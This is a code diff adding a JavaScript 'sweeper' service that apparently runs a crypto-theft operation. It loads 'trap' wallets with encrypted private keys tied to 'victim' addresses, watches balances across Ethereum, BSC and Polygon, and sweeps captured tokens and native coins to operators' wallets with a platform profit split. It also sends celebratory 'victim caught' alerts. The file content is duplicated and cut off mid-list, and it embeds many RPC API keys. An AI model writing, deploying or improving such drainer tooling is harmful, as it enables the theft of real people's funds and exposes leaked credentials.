+            `✅ *Status:* Successfully swept to your safe wallet.\n\n` +
+            `🔗 *TX:* [${txHashShort}](${txUrl})`;
+
+          const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
+            `Campaign ID: ${trapCampaignId}\n` +
+            `Asset: ${token.symbol}\n` +
+            `Amount: ${formatted} ${token.symbol}\n` +
+            `🔗 TX: ${txUrl}`;
+
+          await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
+        }
+      }
+    } catch (e) {
+      logger.debug(`Error processing ${token.symbol} for ${trapAddress}: ${e.message}`);
+    }
+  }
+
+  // 2. Native Sweep
+  const spendableNativeFinal = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;
+  if (spendableNativeFinal > 0n) {
+    const nativePrice = prices[nativeSymbol.toLowerCase()] || 0;
+    const ethValue = parseFloat(formatEther(spendableNativeFinal));
+    const usdValue = ethValue * nativePrice;
+    const isNativePriceMissing = nativePrice === 0;
+
+    const meetsThreshold = (isPriceFeedDown || isNativePriceMissing)
+      ? spendableNativeFinal >= MIN_ETH_SWEEP
+      : usdValue >= MIN_SWEEP_USD;
+
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapAddress, trapCampaignId);
+
+    if (meetsThreshold) {
+      try {
+        const gasPrice = await getGasPrice();
+        const gasLimit = (useSplitting && serviceWallet) ? 42000n : 21000n;
+        const gasCost = gasLimit * gasPrice;
+        const totalSendable = spendableNativeFinal - gasCost;
+
+        if (totalSendable > 0n) {
+          let userAmount = totalSendable;
+          let serviceAmount = 0n;
+          let userTxHash = null, serviceTxHash = null;
+
+          const buildAndSendNativeTx = async (recipient, amount) => {
+            const nonce = await getNonce();
+            const txRequest = { to: recipient, value: amount, gas: 21000n, nonce, gasPrice, chainId: viemChain.id };
+            const serializedTx = await account.signTransaction(txRequest);
+            return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
+          };
+
+          if (useSplitting && serviceWallet) {
+            if (fallbackToAdmin) {
+              userAmount = 0n;
+              serviceAmount = totalSendable;
+            } else {
+              const userShare = profitSplitPercent / 100;
+              userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
+              serviceAmount = totalSendable - userAmount;
+            }
+
+            if (userAmount > 0n && userSafeWallet) {
+              try { userTxHash = await buildAndSendNativeTx(userSafeWallet, userAmount); sweptAny = true; }
+              catch (err) { logger.error(`Native user tx error: ${err.message}`); }
+            }
+            if (serviceAmount > 0n && serviceWallet) {
+              try { serviceTxHash = await buildAndSendNativeTx(serviceWallet, serviceAmount); sweptAny = true; }
+              catch (err) { logger.error(`Native service tx error: ${err.message}`); }
+            }
+          } else {
+            try { userTxHash = await buildAndSendNativeTx(userSafeWallet, totalSendable); sweptAny = true; }
+            catch (err) { logger.error(`Native sweep tx error: ${err.message}`); }
+          }
+
+          if (userTxHash || serviceTxHash) {
+            const txHash = userTxHash || serviceTxHash;
+            if (trapCampaignId && supabaseService) {
+              const txId = await createTransaction(trapCampaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown || isNativePriceMissing ? 0 : usdValue, txHash, 'sweep');
+              if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
+            }
+
+            // 🚀 PROFESSIONAL NOTIFICATIONS FOR NATIVE
+            const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
+            const trapUrl = getExplorerUrl(trapAddress);
+            const txUrl = getExplorerUrl(txHash, 'tx');
+
+            if (fallbackToAdmin) {
+              const userFallbackMsg = `⚠️ *Important Update Regarding Your Trap*\n\n` +
+                `Your trap successfully captured ${nativeSymbol}, but no safe wallet address was configured.\n\n` +
+                `For security, the funds (*${formatEther(totalSendable)} ${nativeSymbol}* ≈ $${usdValue.toFixed(2)}) have been secured in the platform admin wallet.\n\n` +
+                `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n\n` +
+                `👉 *Action Required:* Please update your campaign's safe wallet address in your dashboard.\n\n` +
+                `🔗 *TX:* [${txHashShort}](${txUrl})`;
+
+              const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
+                `Campaign ID: ${trapCampaignId}\n` +
+                `Trap: ${trapAddress}\n` +
+                `Asset: ${nativeSymbol}\n` +
+                `Amount: ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
+                `Reason: User safe wallet not configured.\n` +
+                `🔗 TX: ${txUrl}`;
+
+              await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
+            } else {
+              const userSuccessMsg = `🎉 *Congratulations! Your trap has successfully captured funds!*\n\n` +
+                `💰 *Asset:* ${nativeSymbol}\n` +
+                `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` +
+                `💵 *Amount:* ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
+                `✅ *Status:* Successfully swept to your safe wallet.\n\n` +
+                `🔗 *TX:* [${txHashShort}](${txUrl})`;
+
+              const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
+                `Campaign ID: ${trapCampaignId}\n` +
+                `Asset: ${nativeSymbol}\n` +
+                `Amount: ${formatEther(totalSendable)} ${nativeSymbol}\n` +
+                `🔗 TX: ${txUrl}`;
+
+              await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
+            }
+          }
+        }
+      } catch (e) {
+        logger.debug(`Error processing native for ${trapAddress}: ${e.message}`);
+      }
+    }
+  }
+  return { swept: sweptAny, needsGas: anyNeedsGasInThisTrap };
+}
+
+// --- Batch mode with Advanced Multicall Batching ---
+async function sweepBatch() {
+  let entries = [];
+  let trapToVictim = new Map();
+
+  try {
+    entries = await getTrapsFromDB(campaignId);
+  } catch (err) {
+    logger.error(`Failed to load traps: ${err.message}`);
+    if (jobId) await updateJob('failed', null, null, 'Failed to load traps');
+    return;
+  }
+
+  if (entries.length === 0) {
+    await sendCustomDualAlert(
+      `ℹ️ Sweep cycle complete: No traps found to process.`,
+      `[ADMIN] ℹ️ Sweep cycle complete: No traps found to process.`
+      , campaignId);
+    return;
+  }
+
+  for (const e of entries) {
+    if (e.victimAddress) trapToVictim.set(e.trapAddress.toLowerCase(), e.victimAddress);
+  }
+
+  logger.info(`Loaded ${entries.length} trap addresses`);
+
+  let isSweeping = false;
+  const total = entries.length;
+
+  const runSweep = async () => {
+    if (isSweeping) return;
+    isSweeping = true;
+    let processedCount = 0;
+    let anySwept = false;
+    let anyNeedsGas = false; // 🚀 NEW: Track if any trap caught funds but lacked gas
+
+    try {
+      const CHUNK_SIZE = 20;
+
+      for (let i = 0; i < entries.length; i += CHUNK_SIZE) {
+        if (jobId && await isJobCancelled(jobId)) {
+          logger.info(`Job ${jobId} cancelled. Stopping.`);
+          isSweeping = false;
+          return;
+        }
+
+        const chunk = entries.slice(i, i + CHUNK_SIZE);
+        const multicallContracts = [];
+        for (const entry of chunk) {
+          for (const token of TOKEN_LIST) {
+            multicallContracts.push({
+              address: getAddress(token.address),
+              abi: ERC20_ABI,
+              functionName: 'balanceOf',
+              args: [entry.trapAddress]
+            });
+          }
+        }
+
+        const results = await withRetry(() => publicClient.multicall({ contracts: multicallContracts, allowFailure: true }), 'multicall_chunk', 2, 1000);
+        const nativeBalancePromises = chunk.map(entry => withRetry(() => publicClient.getBalance({ address: entry.trapAddress }), 'getBalance', 2, 1000));
+        const nativeBalances = await Promise.all(nativeBalancePromises);
+
+        let resultIndex = 0;
+        for (let j = 0; j < chunk.length; j++) {
+          const entry = chunk[j];
+          const trapBalances = { native: nativeBalances[j], tokens: {} };
+
+          for (const token of TOKEN_LIST) {
+            const res = results[resultIndex++];
+            if (res && res.status === 'success' && res.result > 0n) {
+              trapBalances.tokens[token.symbol] = { balance: res.result, decimals: token.decimals };
+            }
+          }
+
+          const result = await executeSweepForTrap(entry, trapBalances);
+          if (result.swept) anySwept = true;
+          if (result.needsGas) anyNeedsGas = true;
+
+          processedCount++;
+          if (jobId) await updateJob('running', processedCount, total, `Sweeping ${processedCount}/${total}`);
+        }
+      }
+
+      if (!anySwept) {
+        const now = Date.now();
+        if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
+          // 🚀 FIX: Admin-only alerts for the 4-hour cycle summary
+          if (anyNeedsGas) {
+            await sendAlert(
+              `[ADMIN] ℹ️ 4-Hour Sweep Summary: Funds were captured in some traps, but they lack the native gas to sweep. (Users were already notified via immediate alerts).`,
+              'info'
+            );
+          } else {
+            await sendAlert(
+              `[ADMIN] ℹ️ 4-Hour Sweep Summary: No balances above thresholds were found for ${total} traps.`,
+              'info'
+            );
+          }
+          lastNoBalanceAlertTime = now;
+        }
+      } else {
+        await sendAlert(`[ADMIN] ✅ Sweep cycle complete: Successfully processed ${total} traps.`, 'info');
+      }
+    } catch (err) {
+      logger.error(`Batch sweep error: ${err.message}`);
+      await sendAlert(`[ADMIN] ❌ CRITICAL ERROR in sweep batch: ${err.message}`, 'error');
+    } finally {
+      isSweeping = false;
+    }
+  };
+
+  const scheduleNext = () => {
+    setTimeout(async () => {
+      if (jobId && await isJobCancelled(jobId)) return;
+      await runSweep();
+      scheduleNext();
+    }, pollIntervalMs);
+  };
+
+  await runSweep();
+
+  if (jobId) {
+    // 🚀 FIX: This was a manual sweep triggered by the dashboard.
+    // We are done. Mark as completed and EXIT the process to prevent infinite looping.
+    await updateJob('completed', total, total, 'Manual sweep cycle complete');
+    logger.info(`[Job ${jobId}] ✅ Manual sweep complete. Exiting process.`);
+    process.exit(0);
+  } else {
+    // This is the background daemon (PM2). Keep polling indefinitely.
+    scheduleNext();
+    onShutdown(() => { logger.info('Sweeper stopping...'); });
+  }
+}
+
+// --- Single mode ---
+async function sweepSingle(privateKey, destination) {
+  const account = privateKeyToAccount(privateKey);
+  const trapAddress = account.address;
+  logger.info(`Monitoring Poisoned Wallet: ${trapAddress}`);
+
+  let isRunning = false;
+  const run = async () => {
+    if (isRunning) return;
+    isRunning = true;
+    try {
+      const multicallContracts = TOKEN_LIST.map(token => ({
+        address: getAddress(token.address), abi: ERC20_ABI, functionName: 'balanceOf', args: [trapAddress]
+      }));
+      const results = await publicClient.multicall({ contracts: multicallContracts, allowFailure: true });
+      const trapBalances = {
+        native: await publicClient.getBalance({ address: trapAddress }),
+        tokens: {}
+      };
+      results.forEach((res, i) => {
+        if (res && res.status === 'success' && res.result > 0n) {
+          trapBalances.tokens[TOKEN_LIST[i].symbol] = { balance: res.result, decimals: TOKEN_LIST[i].decimals };
+        }
+      });
+
+      await executeSweepForTrap({ account, trapAddress, victimAddress: null, singleDestination: destination }, trapBalances);
+    } catch (err) {
+      logger.error(`Sweep error: ${err.message}`);
+    } finally {
+      isRunning = false;
+    }
+  };
+  const interval = setInterval(run, pollIntervalMs);
+  run();
+  onShutdown(() => { clearInterval(interval); logger.info('Sweeper interval cleared.'); });
+}
+
+// --- Graceful shutdown & Entry point ---
+setupGracefulShutdown();
+await loadCaughtVictims();
+setInterval(loadCaughtVictims, 30000);
+
+if (jobId) updateJob('running').catch(err => logger.error(`Failed to update job start: ${err.message}`));
+
+const privateKey = process.env.SWEEPER_PRIVATE_KEY;
+if (privateKey && process.env.SAFE_WALLET_ADDRESS) {
+  await sweepSingle(privateKey, process.env.SAFE_WALLET_ADDRESS);
+} else {
+  await sweepBatch();
+}
+===== END FILE: src/sweeper.js =====
+
+
+===== FILE: src/sweeper.js =====
+import 'dotenv/config';
+import { createPublicClient, http, formatEther, formatUnits, parseAbi, encodeFunctionData, getAddress, fallback } from 'viem';
+import { privateKeyToAccount } from 'viem/accounts';
+import { mainnet, bsc, polygon } from 'viem/chains';
+import axios from 'axios';
+import { createClient } from '@supabase/supabase-js';
+
+import { config as globalConfig } from '../lib/config.js';
+import logger from '../lib/logger.js';
+import { withRetry } from '../lib/retry.js';
+import { sendAlert } from '../lib/notifier.js';
+import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
+import { decrypt } from '../lib/encryption.js';
+
+console.log('[DEBUG] Starting ultra-optimized sweeper.js...');
+
+// --- Parse command line args ---
+const args = process.argv.slice(2);
+let campaignId = null;
+let jobId = null;
+for (let i = 0; i < args.length; i++) {
+  if (args[i] === '--campaign-id') campaignId = args[++i];
+  if (args[i] === '--job-id') jobId = args[++i];
+}
+campaignId = campaignId || process.env.CAMPAIGN_ID;
+jobId = jobId || process.env.JOB_ID;
+
+if (campaignId) console.log(`[DEBUG] Campaign ID: ${campaignId}`);
+if (jobId) console.log(`[DEBUG] Job ID: ${jobId}`);
+
+// --- Supabase Service Client ---
+const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
+const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
+let supabaseService = null;
+if (supabaseUrl && supabaseServiceKey) {
+  supabaseService = createClient(supabaseUrl, supabaseServiceKey);
+}
+
+// --- Config ---
+const {
+  sweeper: { pollIntervalMs },
+  rpc: { sweeper: sweeperRpcUrl },
+} = globalConfig;
+
+const SERVICE_WALLET = process.env.SERVICE_WALLET_ADDRESS;
+
+// --- Thresholds ---
+const MIN_CATCH_USD = parseFloat(process.env.MIN_CATCH_USD || '1000');
+const MIN_SWEEP_USD = parseFloat(process.env.MIN_SWEEP_USD || '100');
+const MIN_ETH_SWEEP = BigInt(process.env.MIN_ETH_SWEEP_WEI || '1000000000000000');
+const MIN_TOKEN_SWEEP = BigInt(process.env.MIN_TOKEN_SWEEP || '1000000000000000');
+
+// --- State & Caches ---
+const caughtVictims = new Set();
+const NO_BALANCE_COOLDOWN_MS = 4 * 60 * 60 * 1000; // 4 hours
+let lastNoBalanceAlertTime = 0;
+const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000; // 1 hour
+const lastBalanceAlertTimes = new Map();
+const campaignMetadataCache = new Map();
+
+// 🚀 BULLETPROOF MULTI-SOURCE PRICE FETCHER
+let priceCache = {};
+let lastPriceFetch = 0;
+let priceFetchPromise = null;
+const PRICE_CACHE_MS = 15 * 60 * 1000; // 15 minutes
+
+async function fetchTokenPrices() {
+  const now = Date.now();
+  if (now - lastPriceFetch < PRICE_CACHE_MS && Object.keys(priceCache).length > 0) {
+    return priceCache;
+  }
+
+  if (priceFetchPromise) {
+    return priceFetchPromise;
+  }
+
+  priceFetchPromise = (async () => {
+    try {
+      const nativeSymbol = globalConfig.getChainConfig()?.nativeSymbol || 'ETH';
+      const ids = [nativeSymbol.toLowerCase()];
+      const TOKEN_LIST = globalConfig.getChainConfig()?.tokens ?
+        Object.keys(globalConfig.getChainConfig().tokens).map(s => s.toLowerCase()) :
+        ['usdc', 'usdt', 'wbtc', 'weth', 'dai'];
+
+      const allSymbols = [...new Set([...ids, ...TOKEN_LIST])];
+      let newCache = {};
+
+      // ─── TIER 1: CoinGecko ───
+      try {
+        const symbolToId = { eth: 'ethereum', bnb: 'binancecoin', matic: 'matic-network', pol: 'matic-network', usdc: 'usd-coin', usdt: 'tether', dai: 'dai', wbtc: 'bitcoin', weth: 'weth' };
+        const coinIds = allSymbols.map(s => symbolToId[s]).filter(Boolean);
+        if (coinIds.length > 0) {
+          const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(',')}&vs_currencies=usd`;
+          const resp = await axios.get(url, { timeout: 8000 });
+          if (resp.status === 200) {
+            const data = resp.data;
+            for (const sym of allSymbols) {
+              const id = symbolToId[sym];
+              if (id && data[id] && data[id].usd) {
+                newCache[sym] = data[id].usd;
+              }
+            }
+          }
+        }
+      } catch (e) {
+        logger.warn(`CoinGecko price fetch failed (${e.message}). Trying fallback...`);
+      }
+
+      // ─── TIER 2: Binance API ───
+      if (Object.keys(newCache).length < allSymbols.length) {
+        try {
+          const binancePairs = {
+            eth: 'ETHUSDT', bnb: 'BNBUSDT', matic: 'MATICUSDT', pol: 'POLUSDT',
+            wbtc: 'BTCUSDT', weth: 'ETHUSDT'
+          };
+
+          for (const sym of allSymbols) {
+            if (newCache[sym]) continue;
+            const pair = binancePairs[sym];
+            if (pair) {
+              const url = `https://api.binance.com/api/v3/ticker/price?symbol=${pair}`;
+              const resp = await axios.get(url, { timeout: 5000 });
+              if (resp.status === 200 && resp.data.price) {
+                newCache[sym] = parseFloat(resp.data.price);
+              }
+            }
+          }
+        } catch (e) {
+          logger.warn(`Binance price fetch failed (${e.message}).`);
+        }
+      }
+
+      if (Object.keys(newCache).length > 0) {
+        priceCache = newCache;
+        logger.debug(`Final price cache established: ${JSON.stringify(priceCache)}`);
+      } else {
+        logger.warn(`All price sources failed. Cache remains unchanged or empty.`);
+      }
+    } catch (e) {
+      logger.error(`Critical: All price fetch sources failed: ${e.message}`);
+    } finally {
+      lastPriceFetch = Date.now();
+      priceFetchPromise = null;
+    }
+    return priceCache;
+  })();
+
+  return priceFetchPromise;
+}
+
+// ─── Explorer URL Helper ───
+function getExplorerUrl(address, type = 'address') {
+  let baseUrl = 'https://etherscan.io';
+  if (chainName === 'bsc') baseUrl = 'https://bscscan.com';
+  else if (chainName === 'polygon') baseUrl = 'https://polygonscan.com';
+
+  if (type === 'tx') return `${baseUrl}/tx/${address}`;
+  return `${baseUrl}/address/${address}`;
+}
+
+// 🚀 FIX: Custom dual alert for tailored professional messages
+async function sendCustomDualAlert(userMessage, adminMessage, specificCampaignId = null) {
+  const targetCampaignId = specificCampaignId || campaignId;
+  if (targetCampaignId) {
+    await sendAlert(userMessage, 'info', targetCampaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
+  }
+  await sendAlert(adminMessage, 'info').catch(err => logger.warn(`Admin alert failed: ${err.message}`));
+}
+
+// --- Helper: check if job is cancelled ---
+async function isJobCancelled(jobId) {
+  if (!jobId || !supabaseService) return false;
+  try {
+    const { data, error } = await supabaseService.from('jobs').select('status').eq('id', jobId).single();
+    if (error) throw error;
+    return data?.status === 'cancelled';
+  } catch {
+    return false;
+  }
+}
+
+// --- Helper: update job status ---
+async function updateJob(status, progress = null, total = null, message = null) {
+  if (!jobId || !supabaseService) return;
+  const data = {};
+  if (status) data.status = status;
+  if (progress !== null) data.progress = progress;
+  if (total !== null) data.total = total;
+  if (message) data.message = message;
+  if (status === 'running' && !data.started_at) data.started_at = new Date().toISOString();
+  if (status === 'completed' || status === 'failed') data.completed_at = new Date().toISOString();
+  try {
+    await supabaseService.from('jobs').update(data).eq('id', jobId);
+  } catch (err) {
+    logger.error(`Failed to update job ${jobId}: ${err.message}`);
+  }
+}
+
+// 🚀 CRITICAL FIX: Fetch metadata strictly from the database PER CAMPAIGN
+async function getCampaignMetadata(campId) {
+  if (!campId) return null;
+  if (campaignMetadataCache.has(campId)) {
+    return campaignMetadataCache.get(campId);
+  }
+
+  if (!supabaseService) {
+    logger.error('Supabase service not available to fetch campaign metadata.');
+    return null;
+  }
+
+  try {
+    const { data: campaign, error } = await supabaseService
+      .from('campaigns')
+      .select('user_id, safe_wallet_address')
+      .eq('id', campId)
+      .single();
+
+    if (error || !campaign) {
+      logger.error(`Failed to fetch campaign ${campId}: ${error?.message}`);
+      return null;
+    }
+
+    const { data: user, error: userError } = await supabaseService
+      .from('users')
+      .select('profit_split_percent')
+      .eq('id', campaign.user_id)
+      .single();
+
+    const profitSplitPercent = (!userError && user) ? (user.profit_split_percent || 75) : 75;
+    let userSafeWallet = campaign.safe_wallet_address;
+    let fallbackToAdmin = false;
+
+    // 🚨 NEW LOGIC: If user safe wallet is missing, fallback to admin
+    if (!userSafeWallet) {
+      if (!SERVICE_WALLET) {
+        logger.error(`CRITICAL: Campaign ${campId} has no safe_wallet_address AND no SERVICE_WALLET is configured. Cannot sweep.`);
+        return null; // Abort if we have nowhere to send it
+      }
+      logger.warn(`Campaign ${campId} has no safe_wallet_address. Fallback to admin wallet enabled.`);
+      userSafeWallet = SERVICE_WALLET;
+      fallbackToAdmin = true;
+    }
+
+    const useSplitting = !!SERVICE_WALLET;
+    const serviceWallet = SERVICE_WALLET || null;
+
+    const metadata = { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet, fallbackToAdmin };
+    campaignMetadataCache.set(campId, metadata);
+    return metadata;
+  } catch (err) {
+    logger.error(`Failed to fetch metadata for campaign ${campId}: ${err.message}`);
+    return null;
+  }
+}
+
+// --- Helpers: transaction & profit share records ---
+async function createTransaction(campId, trapAddress, tokenSymbol, amount, usdValue, txHash, type = 'sweep') {
+  if (!supabaseService) return null;
+  try {
+    const { data, error } = await supabaseService.from('transactions').insert({
+      campaign_id: campId, trap_address: trapAddress, token_symbol: tokenSymbol,
+      amount, usd_value: usdValue, tx_hash: txHash, type, status: 'completed',
+    }).select().single();
+    return error ? null : data.id;
+  } catch {
+    return null;
+  }
+}
+
+async function createProfitShare(transactionId, userAmount, serviceAmount, userTxHash, serviceTxHash) {
+  if (!supabaseService) return;
+  try {
+    await supabaseService.from('profit_shares').insert({
+      transaction_id: transactionId, user_amount: userAmount, service_amount: serviceAmount,
+      user_share_tx_hash: userTxHash, service_share_tx_hash: serviceTxHash, settled_at: new Date().toISOString(),
+    });
+  } catch (err) {
+    logger.error(`Failed to record profit share: ${err.message}`);
+  }
+}
+
+// --- Load caught victims from DB ---
+async function loadCaughtVictims() {
+  if (!supabaseService) return;
+  try {
+    const { data, error } = await supabaseService.from('traps').select('victim_address').eq('is_caught', true);
+    if (!error && data && data.length > 0) {
+      const newSet = new Set(data.filter(row => row.victim_address).map(row => row.victim_address.toLowerCase()));
+      caughtVictims.clear();
+      newSet.forEach(addr => caughtVictims.add(addr));
+    }
+  } catch (err) {
+    console.warn(`[DEBUG] Could not load caught victims: ${err.message}`);
+  }
+}
+
+// --- Mark victim as caught ---
+async function markVictimCaught(victimAddress, trapAddress, trapCampaignId = null) {
+  if (!victimAddress) return;
+  const addr = victimAddress.toLowerCase();
+  if (caughtVictims.has(addr)) return;
+  caughtVictims.add(addr);
+  if (!supabaseService) return;
+  try {
+    await supabaseService.from('traps').update({ is_caught: true }).eq('victim_address', addr);
+
+    const victimUrl = getExplorerUrl(addr);
+    const trapUrl = trapAddress ? getExplorerUrl(trapAddress) : '';
+
+    const userMsg = `🎯 *Congratulations! A victim has been successfully caught.*\n\n` +
+      `👤 *Victim:* [${addr.slice(0, 6)}...${addr.slice(-4)}](${victimUrl})\n` +
+      (trapUrl ? `📍 *Trap:* [${trapAddress.slice(0, 6)}...${trapAddress.slice(-4)}](${trapUrl})\n` : '') +
+      `✅ *Status:* Trap activated and ready for sweeping.`;
+
+    const adminMsg = `[ADMIN] 🎯 Victim caught successfully.\nCampaign ID: ${trapCampaignId || campaignId}\nVictim: ${addr}\nTrap: ${trapAddress}`;
+
+    await sendCustomDualAlert(userMsg, adminMsg, trapCampaignId || campaignId);
+  } catch (err) {
+    logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
+  }
+}
+
+// --- MULTI‑CHAIN setup ---
+const chainName = globalConfig.chain || 'ethereum';
+const chainCfg = globalConfig.getChainConfig ? globalConfig.getChainConfig() : null;
+const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';
+
+let viemChain;
+switch (chainName) {
+  case 'bsc': viemChain = bsc; break;
+  case 'polygon': viemChain = polygon; break;
+  default: viemChain = mainnet;
+}
+
+// --- Load traps from DB ---
+async function getTrapsFromDB(campId = null) {
+  if (!supabaseService) return [];
+  try {
+    let query = supabaseService.from('traps').select('trap_private_key_enc, victim_address, trap_address, campaign_id');
+    if (campId) {
+      query = query.eq('campaign_id', campId);
+    } else {
+      const { data: campaigns, error: campError } = await supabaseService.from('campaigns').select('id').eq('chain', chainName);
+      if (campError || !campaigns || campaigns.length === 0) return [];
+      query = query.in('campaign_id', campaigns.map(c => c.id));
+    }
+
+    const { data, error } = await query;
+    if (error || !data || data.length === 0) return [];
+
+    const entries = [];
+    for (const row of data) {
+      if (!row.trap_private_key_enc) continue;
+      try {
+        const privateKey = decrypt(row.trap_private_key_enc);
+        const account = privateKeyToAccount(privateKey);
+        entries.push({
+          account,
+          trapAddress: account.address.toLowerCase(),
+          victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
+          campaignId: row.campaign_id,
+        });
+      } catch (e) {
+        logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
+      }
+    }
+    return entries;
+  } catch (err) {
+    logger.error(`Failed to fetch traps: ${err.message}`);
+    return [];
+  }
+}
+
+let TOKEN_LIST = [];
+if (chainCfg && chainCfg.tokens) {
+  const tokenDecimals = chainCfg.token_decimals || {};
+  TOKEN_LIST = Object.entries(chainCfg.tokens).map(([symbol, address]) => ({
+    symbol, address, decimals: tokenDecimals[symbol] ?? 18
+  }));
+} else {
+  TOKEN_LIST = [
+    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
+    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
+    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
+    { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
+    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
+  ];
+}
+
+const chainRpc = chainCfg?.rpc || sweeperRpcUrl;
+
+// ─── Public RPC Fallbacks ───
+const PUBLIC_FALLBACKS = {
+  bsc: [
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_3_Bpj7ORVica5UbSitOXm',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_AMGRdQ1DjpCspfYgaJWk8',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_n0iXFk0U2atdbZFyJw3Vd',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_uG-HMTi_h9uFfpZ0IPtUC',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_Of_5h7lrnjaNskMMN1m_O',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_JXJn_G0u41v-ORLH-PLvm',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_6DY1YYDbhjfaDTRvVlb8E',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_FY7h0VVmtvSHzWHULlBYD',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_e2hNo6urdy-p9K3iCKBRz',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_wT_5s_3jEKZRUHS6-9qlB',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_xo7rkNtpCG3XTTte_34Oe',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
+    'https://bsc-dataseed.binance.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
+    'https://rpc.ankr.com/bsc',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
+    'https://bsc.publicnode.com',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
+    'https://1rpc.io/bnb',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
+    'https://bsc.drpc.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
+  ],
+  polygon: [
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_6bgVHMAQFQbOqC7cHZ5tU',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_e1PIp-UVXQ1jZWINkbmDm',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_n9bFKwbW1lFSXd-CTjFA8',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_VXeIGTUmcC8G4X4a4Lx8e',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_adXxpjamb8lNBSSnH-dZF',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_vUHRCAI2B5z-NVbge5MjR',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_YXuYd2T6nO-_ASx3VyYd8',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_o4lfkzzsAyG0uEFq9cfx0',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_6vT8KHKebKLX2IzQCgHpo',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_C7D8h3Jq99k3QweZHq1Ip',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_1t_00WgSdtEqIYYRY8LdA',
+    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+    'https://polygon-rpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+    'https://rpc.ankr.com/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+    'https://polygon.llamarpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+    'https://polygon.publicnode.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+    'https://1rpc.io/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
